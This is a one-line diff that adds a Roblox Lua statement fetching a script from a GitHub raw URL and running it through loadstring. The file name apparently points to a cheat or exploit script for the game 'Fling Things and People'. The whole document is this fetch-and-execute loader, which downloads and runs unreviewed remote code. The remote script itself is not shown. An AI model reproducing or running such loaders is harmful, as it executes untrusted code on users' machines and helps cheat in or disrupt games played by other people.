@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/fling-things-and-people-spam4-m75b3jvweyo85g.lua"))()
